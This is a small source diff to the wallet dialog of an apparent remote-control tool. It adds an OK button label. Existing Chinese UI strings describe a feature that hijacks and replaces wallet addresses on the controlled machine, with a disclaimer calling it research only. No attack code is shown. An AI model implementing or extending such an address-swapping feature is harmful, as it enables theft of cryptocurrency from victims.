@@ -61,6 +61,7 @@ BOOL CWalletDlg::OnInitDialog()
     SetDlgItemText(IDC_STATIC_WALLET_Solana_2402, _TR("Solana:"));
     SetDlgItemText(IDC_STATIC_WALLET_TIP, _TR("提示信息: 劫持并替换被控端钱包地址；总字符数最多是470，只填写所需的地址，不需要全部填满。"));
     SetDlgItemText(IDC_STATIC_WALLET_WARNING, _TR("警告信息: 此功能仅用于开源项目之研究，用户自行承担后果，不得用于非法目的。"));
+    SetDlgItemText(IDOK, _TR("确定"));
 
     auto a = StringToVector(m_str.GetString(), ';', MAX_WALLET_NUM);
     m_EditBTC.SetWindowTextA(a[ADDR_BTC].c_str());
